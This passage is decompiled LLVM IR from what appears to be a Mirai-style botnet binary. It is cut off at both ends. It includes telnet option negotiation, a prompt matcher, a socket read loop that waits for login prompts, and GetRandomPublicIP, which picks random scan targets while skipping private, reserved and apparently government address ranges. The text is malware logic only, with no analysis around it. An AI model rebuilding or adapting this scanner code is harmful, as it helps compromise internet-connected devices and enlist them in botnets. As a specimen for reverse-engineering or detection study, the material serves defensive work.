  %v2_10002938 = load i8, i8* %v1_100028d0, align 1
  %v3_10002940 = icmp eq i8 %v2_10002938, -4
  br i1 %v3_10002940, label %dec_label_pc_10002948, label %dec_label_pc_10002954

dec_label_pc_10002948:                            ; preds = %dec_label_pc_10002910
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_10002954:                            ; preds = %dec_label_pc_10002910
  %v2_1000295c = load i8, i8* %v1_100028d0, align 1
  %v3_10002964 = icmp eq i8 %v2_1000295c, -2
  br i1 %v3_10002964, label %dec_label_pc_1000296c, label %dec_label_pc_10002978

dec_label_pc_1000296c:                            ; preds = %dec_label_pc_10002954
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_10002978:                            ; preds = %dec_label_pc_10002954
  %v2_10002980 = load i8, i8* %v1_100028d0, align 1
  %v3_10002988 = icmp eq i8 %v2_10002980, 3
  br i1 %v3_10002988, label %dec_label_pc_10002990, label %dec_label_pc_100029c8

dec_label_pc_10002990:                            ; preds = %dec_label_pc_10002978
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_100029c8:                            ; preds = %dec_label_pc_10002978
  %v3_100029a0 = icmp eq i8 %v2_10002980, -3
  %.7 = select i1 %v3_100029a0, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100029fc

dec_label_pc_100029fc:                            ; preds = %dec_label_pc_10002990, %dec_label_pc_1000296c, %dec_label_pc_10002948, %dec_label_pc_100029c8
  store i32 268446228, i32* @lr, align 4
  %v4_10002a10 = call i32 @__libc_send(i32 %arg1, i32 %v2_1000291c, i32 1, i32 16384)
  %v1_10002a18 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_10002a30.47 to i32), i32* @lr, align 4
  %v4_10002a2c = call i32 @__libc_send(i32 %arg1, i32 %v1_10002a18, i32 1, i32 16384)
  br label %dec_label_pc_10002a38

dec_label_pc_10002a38:                            ; preds = %dec_label_pc_100028f4, %dec_label_pc_100029fc, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_10002a38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100029fc, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10002a84 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10011c60.48 to i32), i32* @r3, align 4
  %v0_10002bc010 = call i32 @__GI_strlen()
  %v2_10002bc812 = icmp eq i32 %v0_10002bc010, 0
  br i1 %v2_10002bc812, label %dec_label_pc_10002bd8, label %dec_label_pc_10002ab0.preheader.lr.ph

dec_label_pc_10002ab0.preheader.lr.ph:            ; preds = %entry
  %v2_10002acc = add i32 %v0_10002a84, %arg1
  br label %dec_label_pc_10002ab0.preheader

dec_label_pc_10002aa4:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002b10, %dec_label_pc_10002ae8, %dec_label_pc_10002ac0
  %v1_10002aa8 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002ab8 = icmp sgt i32 %v0_10002a84, %v1_10002aa8
  br i1 %v3_10002ab8, label %dec_label_pc_10002ac0, label %dec_label_pc_10002b60

dec_label_pc_10002ac0:                            ; preds = %dec_label_pc_10002ab0.preheader, %dec_label_pc_10002aa4
  %stack_var_-40.08 = phi i32 [ %v1_10002aa8, %dec_label_pc_10002aa4 ], [ %stack_var_-40.115, %dec_label_pc_10002ab0.preheader ]
  %v2_10002ad4 = sub i32 %v2_10002acc, %stack_var_-40.08
  %v1_10002ad8 = inttoptr i32 %v2_10002ad4 to i8*
  %v2_10002ad8 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002ae0 = icmp eq i8 %v2_10002ad8, 0
  br i1 %v3_10002ae0, label %dec_label_pc_10002aa4, label %dec_label_pc_10002ae8

dec_label_pc_10002ae8:                            ; preds = %dec_label_pc_10002ac0
  %v2_10002b00 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b08 = icmp eq i8 %v2_10002b00, 32
  br i1 %v3_10002b08, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b10

dec_label_pc_10002b10:                            ; preds = %dec_label_pc_10002ae8
  %v2_10002b28 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b30 = icmp eq i8 %v2_10002b28, 13
  br i1 %v3_10002b30, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b38

dec_label_pc_10002b38:                            ; preds = %dec_label_pc_10002b10
  %v2_10002b50 = load i8, i8* %v1_10002ad8, align 1
  %v3_10002b58 = icmp eq i8 %v2_10002b50, 10
  br i1 %v3_10002b58, label %dec_label_pc_10002aa4, label %dec_label_pc_10002b60

dec_label_pc_10002b60:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002aa4, %dec_label_pc_10002ab0.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002ab0.preheader ], [ %stack_var_-40.08, %dec_label_pc_10002b38 ], [ %v1_10002aa8, %dec_label_pc_10002aa4 ]
  %v2_10002b74 = sub i32 %v2_10002acc, %stack_var_-40.0.lcssa
  %v1_10002b78 = inttoptr i32 %v2_10002b74 to i8*
  %v2_10002b78 = load i8, i8* %v1_10002b78, align 1
  %v2_10002b8c = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10011c60.48 to i32)
  %v1_10002b90 = inttoptr i32 %v2_10002b8c to i8*
  %v2_10002b90 = load i8, i8* %v1_10002b90, align 1
  %v4_10002b98 = icmp eq i8 %v2_10002b78, %v2_10002b90
  br i1 %v4_10002b98, label %dec_label_pc_10002bd8, label %dec_label_pc_10002bac

dec_label_pc_10002bac:                            ; preds = %dec_label_pc_10002b60
  %v1_10002bb0 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10011c60.48 to i32), i32* @r3, align 4
  %v0_10002bc0 = call i32 @__GI_strlen()
  %v2_10002bc8 = icmp ult i32 %v1_10002bb0, %v0_10002bc0
  br i1 %v2_10002bc8, label %dec_label_pc_10002ab0.preheader, label %dec_label_pc_10002bd8

dec_label_pc_10002ab0.preheader:                  ; preds = %dec_label_pc_10002ab0.preheader.lr.ph, %dec_label_pc_10002bac
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002ab0.preheader.lr.ph ], [ %v1_10002bb0, %dec_label_pc_10002bac ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002ab0.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002bac ]
  %v3_10002ab86 = icmp sgt i32 %v0_10002a84, %stack_var_-40.115
  br i1 %v3_10002ab86, label %dec_label_pc_10002ac0, label %dec_label_pc_10002b60

dec_label_pc_10002bd8:                            ; preds = %entry, %dec_label_pc_10002b60, %dec_label_pc_10002bac
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002b60 ], [ 0, %dec_label_pc_10002bac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002bb0, { 1, 0 }
  uselistorder i32 %v0_10002a84, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10011c60.48 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002bd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002ab0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002b60, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002c2c = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002e6c5 = add i32 %v0_10002c2c, 2
  %v2_10002e746 = icmp slt i32 %v1_10002e6c5, %arg7
  br i1 %v2_10002e746, label %dec_label_pc_10002e7c.lr.ph, label %dec_label_pc_10002eac

dec_label_pc_10002e7c.lr.ph:                      ; preds = %entry
  %v2_10002c64 = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002cac = udiv i32 %arg1, 32
  %v1_10002cb4 = mul nuw nsw i32 %v1_10002cac, 4
  %v2_10002cb8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002cbc = add nuw nsw i32 %v1_10002cb4, 24
  %v1_10002cc0 = add i32 %v2_10002cbc, %v2_10002cb8
  %v1_10002cc4 = inttoptr i32 %v1_10002cc0 to i32*
  %v1_10002ccc = urem i32 %arg1, 32
  %v3_10002cd4 = shl i32 1, %v1_10002ccc
  %v1_10002cf4 = add i32 %arg1, 1
  %v2_10002cfc = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002e2c = inttoptr i32 %arg2 to i8*
  %v3_10002e40 = icmp eq i32 %arg3, 0
  %v2_10002e8c = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002e7c

dec_label_pc_10002c64:                            ; preds = %dec_label_pc_10002e88, %dec_label_pc_10002e7c
  store i32 %v2_10002c64, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge

dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge: ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge, %dec_label_pc_10002c64
  %v3_10002c7c.pre = phi i32 [ %v2_10002c64, %dec_label_pc_10002c64 ], [ %v3_10002c7c.pre.pre, %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge ]
  %v1_10002c9436 = phi i32 [ 1, %dec_label_pc_10002c64 ], [ %v1_10002c94, %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge ]
  %v1_10002c80 = mul nuw nsw i32 %v1_10002c9436, 4
  %v2_10002c84 = add i32 %v1_10002c80, %v3_10002c7c.pre
  %v2_10002c8c = inttoptr i32 %v2_10002c84 to i32*
  store i32 0, i32* %v2_10002c8c, align 4
  %v1_10002c94 = add nuw nsw i32 %v1_10002c9436, 1
  %tmp33 = icmp ult i32 %v1_10002c94, 32
  br i1 %tmp33, label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge, label %dec_label_pc_10002ca8

dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge.dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge_crit_edge: ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge
  %v3_10002c7c.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge

dec_label_pc_10002ca8:                            ; preds = %dec_label_pc_10002c78.dec_label_pc_10002c78_crit_edge
  %v2_10002cc4 = load i32, i32* %v1_10002cc4, align 4
  %v2_10002cd8 = or i32 %v2_10002cc4, %v3_10002cd4
  store i32 %v2_10002cd8, i32* %v1_10002cc4, align 4
  store i32 268447000, i32* @lr, align 4
  %v5_10002d14 = call i32 @__libc_select(i32 %v1_10002cf4, i32 %v2_10002c64, i32 0, i32 0, i32 %v2_10002cfc)
  %tmp34 = icmp slt i32 %v5_10002d14, 1
  br i1 %tmp34, label %dec_label_pc_10002eac, label %dec_label_pc_10002d24

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002ca8
  %v2_10002d30 = add i32 %stack_var_-196.09, %arg6
  store i32 268447052, i32* @lr, align 4
  %v4_10002d48 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002d30, i32 1, i32 0)
  %v4_10002d5c = icmp eq i32 %v4_10002d48, -1
  br i1 %v4_10002d5c, label %dec_label_pc_10002d70, label %dec_label_pc_10002d64

dec_label_pc_10002d64:                            ; preds = %dec_label_pc_10002d24
  %v3_10002d68 = icmp eq i32 %v4_10002d48, 0
  br i1 %v3_10002d68, label %dec_label_pc_10002d70, label %dec_label_pc_10002d7c

dec_label_pc_10002d70:                            ; preds = %dec_label_pc_10002d64, %dec_label_pc_10002d24
  br label %dec_label_pc_10002eb4

dec_label_pc_10002d7c:                            ; preds = %dec_label_pc_10002d64
  %v2_10002d84 = add i32 %v4_10002d48, %stack_var_-196.09
  %v4_10002d8c = inttoptr i32 %v2_10002d30 to i8*
  %v3_10002d90 = load i8, i8* %v4_10002d8c, align 1
  %v3_10002d98 = icmp eq i8 %v3_10002d90, -1
  br i1 %v3_10002d98, label %dec_label_pc_10002da0, label %dec_label_pc_10002e24

dec_label_pc_10002da0:                            ; preds = %dec_label_pc_10002d7c
  %v1_10002da4 = add i32 %v2_10002d30, 1
  store i32 268447164, i32* @lr, align 4
  %v4_10002db8 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002da4, i32 2, i32 0)
  %v4_10002dcc = icmp eq i32 %v4_10002db8, -1
  br i1 %v4_10002dcc, label %dec_label_pc_10002de0, label %dec_label_pc_10002dd4

dec_label_pc_10002dd4:                            ; preds = %dec_label_pc_10002da0
  %v3_10002dd8 = icmp eq i32 %v4_10002db8, 0
  br i1 %v3_10002dd8, label %dec_label_pc_10002de0, label %dec_label_pc_10002dec

dec_label_pc_10002de0:                            ; preds = %dec_label_pc_10002dd4, %dec_label_pc_10002da0
  br label %dec_label_pc_10002eb4

dec_label_pc_10002dec:                            ; preds = %dec_label_pc_10002dd4
  %v2_10002df4 = add i32 %v4_10002db8, %v2_10002d84
  store i32 268447244, i32* @lr, align 4
  %v4_10002e08 = call i32 @negotiate(i32 %arg1, i32 %v2_10002d30, i32 3, i32 %v2_10002d84)
  %v3_10002e10 = icmp eq i32 %v4_10002e08, 0
  br i1 %v3_10002e10, label %dec_label_pc_10002e18, label %dec_label_pc_10002e68.backedge

dec_label_pc_10002e18:                            ; preds = %dec_label_pc_10002dec
  br label %dec_label_pc_10002eb4

dec_label_pc_10002e24:                            ; preds = %dec_label_pc_10002d7c
  store i32 268447280, i32* @lr, align 4
  %v5_10002e2c = call i32 @strstr(i32 %arg6, i8* %v4_10002e2c, i32 %v2_10002d30)
  %v3_10002e34 = icmp eq i32 %v5_10002e2c, 0
  br i1 %v3_10002e34, label %dec_label_pc_10002e3c, label %dec_label_pc_10002ea0

dec_label_pc_10002e3c:                            ; preds = %dec_label_pc_10002e24
  br i1 %v3_10002e40, label %dec_label_pc_10002e68.backedge, label %dec_label_pc_10002e48

dec_label_pc_10002e68.backedge:                   ; preds = %dec_label_pc_10002e3c, %dec_label_pc_10002e48, %dec_label_pc_10002dec
  %stack_var_-196.0.be = phi i32 [ %v2_10002df4, %dec_label_pc_10002dec ], [ %v2_10002d84, %dec_label_pc_10002e3c ], [ %v2_10002d84, %dec_label_pc_10002e48 ]
  %v1_10002e6c = add i32 %stack_var_-196.0.be, 2
  %v2_10002e74 = icmp slt i32 %v1_10002e6c, %arg7
  br i1 %v2_10002e74, label %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge, label %dec_label_pc_10002eac

dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge: ; preds = %dec_label_pc_10002e68.backedge
  %v3_10002e7c.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002e7c

dec_label_pc_10002e48:                            ; preds = %dec_label_pc_10002e3c
  %v1_10002e4c = call i32 @matchPrompt(i32 %arg6)
  %v3_10002e54 = icmp eq i32 %v1_10002e4c, 0
  br i1 %v3_10002e54, label %dec_label_pc_10002e68.backedge, label %dec_label_pc_10002ea0

dec_label_pc_10002e7c:                            ; preds = %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge, %dec_label_pc_10002e7c.lr.ph
  %v3_10002e7c = phi i32 [ %arg4, %dec_label_pc_10002e7c.lr.ph ], [ %v3_10002e7c.pre, %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002c2c, %dec_label_pc_10002e7c.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002e68.backedge.dec_label_pc_10002e7c_crit_edge ]
  %v2_10002e80 = icmp sgt i32 %v3_10002e7c, 0
  br i1 %v2_10002e80, label %dec_label_pc_10002c64, label %dec_label_pc_10002e88

dec_label_pc_10002e88:                            ; preds = %dec_label_pc_10002e7c
  br i1 %v2_10002e8c, label %dec_label_pc_10002c64, label %dec_label_pc_10002eac

dec_label_pc_10002ea0:                            ; preds = %dec_label_pc_10002e24, %dec_label_pc_10002e48
  br label %dec_label_pc_10002eb4

dec_label_pc_10002eac:                            ; preds = %dec_label_pc_10002e68.backedge, %dec_label_pc_10002e88, %dec_label_pc_10002ca8, %entry
  br label %dec_label_pc_10002eb4

dec_label_pc_10002eb4:                            ; preds = %dec_label_pc_10002ea0, %dec_label_pc_10002e18, %dec_label_pc_10002de0, %dec_label_pc_10002d70, %dec_label_pc_10002eac
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002eac ], [ 1, %dec_label_pc_10002ea0 ], [ 0, %dec_label_pc_10002d70 ], [ 0, %dec_label_pc_10002de0 ], [ 0, %dec_label_pc_10002e18 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10002d84, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002c94, { 1, 0 }
  uselistorder i32 %v2_10002c64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002eb4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002eac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10002e68.backedge, { 1, 0, 2 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  store i32 268447468, i32* @lr, align 4
  %v0_10002ee8 = call i32 @random()
  %v2_10002f08 = srem i32 %v0_10002ee8, 223
  %v1_10002f2c = trunc i32 %v2_10002f08 to i8
  store i8 %v1_10002f2c, i8* @global_var_10024a40.49, align 1
  store i32 268447540, i32* @lr, align 4
  %v0_10002f30 = call i32 @random()
  %v2_10002f50 = srem i32 %v0_10002f30, 255
  %v1_10002f74 = trunc i32 %v2_10002f50 to i8
  store i8 %v1_10002f74, i8* @global_var_10024a41.50, align 1
  store i32 268447612, i32* @lr, align 4
  %v0_10002f78 = call i32 @random()
  %v2_10002f98 = srem i32 %v0_10002f78, 255
  %v1_10002fbc = trunc i32 %v2_10002f98 to i8
  store i8 %v1_10002fbc, i8* @global_var_10024a42.51, align 1
  store i32 268447684, i32* @lr, align 4
  %v0_10002fc0 = call i32 @random()
  %v2_10002fe0 = srem i32 %v0_10002fc0, 255
  %extract.t = trunc i32 %v2_10002fe0 to i8
  br label %dec_label_pc_1000312c

dec_label_pc_1000300c:                            ; preds = %dec_label_pc_100033c0, %dec_label_pc_100033ac, %dec_label_pc_10003398, %dec_label_pc_10003384, %dec_label_pc_10003370, %dec_label_pc_1000335c, %dec_label_pc_10003348, %dec_label_pc_10003334, %dec_label_pc_10003320, %dec_label_pc_1000330c, %dec_label_pc_100032f8, %dec_label_pc_100032e4, %dec_label_pc_100032d0, %dec_label_pc_100032bc, %dec_label_pc_100032a8, %dec_label_pc_1000326c, %dec_label_pc_10003244, %dec_label_pc_10003208, %dec_label_pc_100031cc, %dec_label_pc_100031a4, %dec_label_pc_10003190, %dec_label_pc_1000317c, %dec_label_pc_10003168, %dec_label_pc_10003154, %dec_label_pc_10003140, %dec_label_pc_1000312c
  store i32 268447760, i32* @lr, align 4
  %v0_1000300c = call i32 @random()
  %v2_1000302c = srem i32 %v0_1000300c, 223
  %v1_10003050 = trunc i32 %v2_1000302c to i8
  store i8 %v1_10003050, i8* @global_var_10024a40.49, align 1
  store i32 268447832, i32* @lr, align 4
  %v0_10003054 = call i32 @random()
  %v2_10003074 = srem i32 %v0_10003054, 255
  %v1_10003098 = trunc i32 %v2_10003074 to i8
  store i8 %v1_10003098, i8* @global_var_10024a41.50, align 1
  store i32 268447904, i32* @lr, align 4
  %v0_1000309c = call i32 @random()
  %v2_100030bc = srem i32 %v0_1000309c, 255
  %v1_100030e0 = trunc i32 %v2_100030bc to i8
  store i8 %v1_100030e0, i8* @global_var_10024a42.51, align 1
  store i32 268447976, i32* @lr, align 4
  %v0_100030e4 = call i32 @random()
  %v2_10003104 = srem i32 %v0_100030e4, 255
  %extract.t32 = trunc i32 %v2_10003104 to i8
  br label %dec_label_pc_1000312c

dec_label_pc_1000312c:                            ; preds = %entry, %dec_label_pc_1000300c
  %storemerge.in.off0 = phi i8 [ %extract.t, %entry ], [ %extract.t32, %dec_label_pc_1000300c ]
  store i8 %storemerge.in.off0, i8* @global_var_10024a43.52, align 1
  %v3_10003130 = load i8, i8* @global_var_10024a40.49, align 1
  %v4_10003130 = zext i8 %v3_10003130 to i32
  %v3_10003138 = icmp eq i8 %v3_10003130, 127
  br i1 %v3_10003138, label %dec_label_pc_1000300c, label %dec_label_pc_10003140

dec_label_pc_10003140:                            ; preds = %dec_label_pc_1000312c
  %v3_1000314c = icmp eq i8 %v3_10003130, 0
  br i1 %v3_1000314c, label %dec_label_pc_1000300c, label %dec_label_pc_10003154

dec_label_pc_10003154:                            ; preds = %dec_label_pc_10003140
  %v3_10003160 = icmp eq i8 %v3_10003130, 3
  br i1 %v3_10003160, label %dec_label_pc_1000300c, label %dec_label_pc_10003168

dec_label_pc_10003168:                            ; preds = %dec_label_pc_10003154
  %v3_10003174 = icmp eq i8 %v3_10003130, 15
  br i1 %v3_10003174, label %dec_label_pc_1000300c, label %dec_label_pc_1000317c

dec_label_pc_1000317c:                            ; preds = %dec_label_pc_10003168
  %v3_10003188 = icmp eq i8 %v3_10003130, 16
  br i1 %v3_10003188, label %dec_label_pc_1000300c, label %dec_label_pc_10003190

dec_label_pc_10003190:                            ; preds = %dec_label_pc_1000317c
  %v3_1000319c = icmp eq i8 %v3_10003130, 56
  br i1 %v3_1000319c, label %dec_label_pc_1000300c, label %dec_label_pc_100031a4

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_10003190
  %v3_100031b0 = icmp eq i8 %v3_10003130, 10
  br i1 %v3_100031b0, label %dec_label_pc_1000300c, label %dec_label_pc_100031b8

dec_label_pc_100031b8:                            ; preds = %dec_label_pc_100031a4
  %v3_100031c4 = icmp eq i8 %v3_10003130, -64
  br i1 %v3_100031c4, label %dec_label_pc_100031cc, label %dec_label_pc_100031e0

dec_label_pc_100031cc:                            ; preds = %dec_label_pc_100031b8
  %v3_100031d0 = load i8, i8* @global_var_10024a41.50, align 1
  %v3_100031d8 = icmp eq i8 %v3_100031d0, -88
  br i1 %v3_100031d8, label %dec_label_pc_1000300c, label %dec_label_pc_100031e0

dec_label_pc_100031e0:                            ; preds = %dec_label_pc_100031b8, %dec_label_pc_100031cc
  %v3_100031ec = icmp eq i8 %v3_10003130, -84
  br i1 %v3_100031ec, label %dec_label_pc_100031f4, label %dec_label_pc_1000321c

dec_label_pc_100031f4:                            ; preds = %dec_label_pc_100031e0
  %v3_100031f8 = load i8, i8* @global_var_10024a41.50, align 1
  %tmp26 = icmp ult i8 %v3_100031f8, 16
  br i1 %tmp26, label %dec_label_pc_1000321c, label %dec_label_pc_10003208

dec_label_pc_10003208:                            ; preds = %dec_label_pc_100031f4
  %tmp27 = icmp ult i8 %v3_100031f8, 32
  br i1 %tmp27, label %dec_label_pc_1000300c, label %dec_label_pc_1000321c

dec_label_pc_1000321c:                            ; preds = %dec_label_pc_100031e0, %dec_label_pc_10003208, %dec_label_pc_100031f4
  %v3_10003228 = icmp eq i8 %v3_10003130, 100
  br i1 %v3_10003228, label %dec_label_pc_10003230, label %dec_label_pc_10003258

dec_label_pc_10003230:                            ; preds = %dec_label_pc_1000321c
  %v3_10003234 = load i8, i8* @global_var_10024a41.50, align 1
  %tmp28 = icmp ult i8 %v3_10003234, 64
  br i1 %tmp28, label %dec_label_pc_10003258, label %dec_label_pc_10003244

dec_label_pc_10003244:                            ; preds = %dec_label_pc_10003230
  %tmp29 = icmp ult i8 %v3_10003234, 127
  br i1 %tmp29, label %dec_label_pc_1000300c, label %dec_label_pc_10003258

dec_label_pc_10003258:                            ; preds = %dec_label_pc_1000321c, %dec_label_pc_10003244, %dec_label_pc_10003230
  %v3_10003264 = icmp eq i8 %v3_10003130, -87
  br i1 %v3_10003264, label %dec_label_pc_1000326c, label %dec_label_pc_10003280

dec_label_pc_1000326c:                            ; preds = %dec_label_pc_10003258
  %v3_10003270 = load i8, i8* @global_var_10024a41.50, align 1
  %v3_10003278 = icmp eq i8 %v3_10003270, -1
  br i1 %v3_10003278, label %dec_label_pc_1000300c, label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003258, %dec_label_pc_1000326c
  %v3_1000328c = icmp eq i8 %v3_10003130, -58
  br i1 %v3_1000328c, label %dec_label_pc_10003294, label %dec_label_pc_100032bc

dec_label_pc_10003294:                            ; preds = %dec_label_pc_10003280
  %v3_10003298 = load i8, i8* @global_var_10024a41.50, align 1
  %tmp30 = icmp ult i8 %v3_10003298, 18
  br i1 %tmp30, label %dec_label_pc_100032bc, label %dec_label_pc_100032a8

dec_label_pc_100032a8:                            ; preds = %dec_label_pc_10003294
  %tmp31 = icmp ult i8 %v3_10003298, 20
  br i1 %tmp31, label %dec_label_pc_1000300c, label %dec_label_pc_100032bc

dec_label_pc_100032bc:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_100032a8, %dec_label_pc_10003294
  %v3_100032c8 = icmp eq i8 %v3_10003130, -32
  br i1 %v3_100032c8, label %dec_label_pc_1000300c, label %dec_label_pc_100032d0

dec_label_pc_100032d0:                            ; preds = %dec_label_pc_100032bc
  %v3_100032dc = icmp eq i8 %v3_10003130, 6
  br i1 %v3_100032dc, label %dec_label_pc_1000300c, label %dec_label_pc_100032e4

dec_label_pc_100032e4:                            ; preds = %dec_label_pc_100032d0
  %v3_100032f0 = icmp eq i8 %v3_10003130, 7
  br i1 %v3_100032f0, label %dec_label_pc_1000300c, label %dec_label_pc_100032f8

dec_label_pc_100032f8:                            ; preds = %dec_label_pc_100032e4
  %v3_10003304 = icmp eq i8 %v3_10003130, 11
  br i1 %v3_10003304, label %dec_label_pc_1000300c, label %dec_label_pc_1000330c

dec_label_pc_1000330c:                            ; preds = %dec_label_pc_100032f8
  %v3_10003318 = icmp eq i8 %v3_10003130, 21
  br i1 %v3_10003318, label %dec_label_pc_1000300c, label %dec_label_pc_10003320

dec_label_pc_10003320:                            ; preds = %dec_label_pc_1000330c
  %v3_1000332c = icmp eq i8 %v3_10003130, 22
  br i1 %v3_1000332c, label %dec_label_pc_1000300c, label %dec_label_pc_10003334

dec_label_pc_10003334:                            ; preds = %dec_label_pc_10003320
  %v3_10003340 = icmp eq i8 %v3_10003130, 26
  br i1 %v3_10003340, label %dec_label_pc_1000300c, label %dec_label_pc_10003348

dec_label_pc_10003348:                            ; preds = %dec_label_pc_10003334
  %v3_10003354 = icmp eq i8 %v3_10003130, 28
  br i1 %v3_10003354, label %dec_label_pc_1000300c, label %dec_label_pc_1000335c

dec_label_pc_1000335c:                            ; preds = %dec_label_pc_10003348
  %v3_10003368 = icmp eq i8 %v3_10003130, 29
  br i1 %v3_10003368, label %dec_label_pc_1000300c, label %dec_label_pc_10003370

dec_label_pc_10003370:                            ; preds = %dec_label_pc_1000335c
  %v3_1000337c = icmp eq i8 %v3_10003130, 30
  br i1 %v3_1000337c, label %dec_label_pc_1000300c, label %dec_label_pc_10003384

dec_label_pc_10003384:                            ; preds = %dec_label_pc_10003370
  %v3_10003390 = icmp eq i8 %v3_10003130, 33
  br i1 %v3_10003390, label %dec_label_pc_1000300c, label %dec_label_pc_10003398

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003384
  %v3_100033a4 = icmp eq i8 %v3_10003130, 55
  br i1 %v3_100033a4, label %dec_label_pc_1000300c, label %dec_label_pc_100033ac

dec_label_pc_100033ac:                            ; preds = %dec_label_pc_10003398
  %v3_100033b8 = icmp eq i8 %v3_10003130, -42
  br i1 %v3_100033b8, label %dec_label_pc_1000300c, label %dec_label_pc_100033c0

dec_label_pc_100033c0:                            ; preds = %dec_label_pc_100033ac
  %v3_100033cc = icmp eq i8 %v3_10003130, -41
  br i1 %v3_100033cc, label %dec_label_pc_1000300c, label %dec_label_pc_100033d4

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c0
  store i32 0, i32* %stack_var_-56, align 4
  %v2_100033f4 = ptrtoint i32* %stack_var_-56 to i32
